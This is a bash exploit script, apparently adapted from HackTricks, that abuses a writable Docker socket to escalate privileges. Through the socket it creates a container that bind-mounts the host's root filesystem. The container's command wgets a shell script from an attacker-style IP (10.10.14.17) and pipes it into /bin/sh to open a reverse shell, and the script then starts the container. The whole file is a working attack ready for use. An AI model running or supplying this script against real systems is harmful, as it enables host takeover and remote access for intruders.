#!/bin/bash

set -x

# Initially from: https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
# Containers directly reach out to the host though

echo "Getting images"
images_response=$(curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json)
echo "${images_response}"

echo "Picking a random image - note that the container might not have the required runtime depenendecies"
image_name=$(echo "${images_response}" | grep -Po '"Id":"[^"]+"' | tail -n 1 | cut -f4 -d '"' | cut -f 2 -d ':')

echo "Choosing image name: ${image_name}"

echo "Creating container"
container_config="{\"Image\":\"${image_name}\",\"EntryPoint\": [\"\"], \"Cmd\":[\"/bin/sh\", \"-c\", \"wget 10.10.14.17/shells/one_line_python.py/4447 -O- | /bin/sh\"],\"DetachKeys\":\"Ctrl-p,Ctrl-q\",\"OpenStdin\":true,\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/\",\"Target\":\"/host_root\"}]}"
create_container_response=$(curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "${container_config}" http://localhost/containers/create)
container_id=$(echo "${create_container_response}" | grep -Po '"Id":"([^"])+"' | cut -f4 -d '"')
echo "Extracted container_id: ${container_id}"

echo "Starting container"
curl -v -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/${container_id}/start
